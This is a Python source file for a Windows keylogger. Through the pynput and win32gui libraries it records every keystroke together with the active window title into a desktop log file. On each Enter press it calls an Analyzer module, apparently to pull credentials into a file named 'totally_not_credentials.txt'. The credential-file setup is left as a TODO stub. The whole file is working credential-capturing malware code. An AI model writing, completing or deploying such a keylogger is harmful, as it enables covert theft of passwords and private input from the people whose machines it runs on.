from pynput.keyboard import Key, Listener
from win32gui import GetWindowText, GetForegroundWindow
import logging
import Analyzer

log_file = 'C:\\Users\\Benjamin Pollak\\Desktop\\log.txt'
cred_file = 'C:\\Users\\Benjamin Pollak\\Desktop\\totally_not_credentials.txt'

class Logger:
    def __init__(self, log_file, cred_file):
        self.log_file = log_file
        self.cred_file = cred_file
        logging.basicConfig(filename=(log_file), level=logging.DEBUG,
                            format=( '%(message)s : '))
        self.analyzer = Analyzer.Analyzer(log_file, cred_file)
        self.configCredFile()
    
    def configCredFile(self):
        print("TODO: config cred file")
    
    def on_press(self, Key):
        log_str = str(Key) + ' | ' + GetWindowText(GetForegroundWindow())
        logging.info(log_str)
        if(str(Key) == 'Key.enter'):
            done_analyzing = self.analyzer.parse_log_file()
            if done_analyzing:
                return False
    
    def log_keys(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    logger = Logger(log_file, cred_file)
    logger.log_keys()
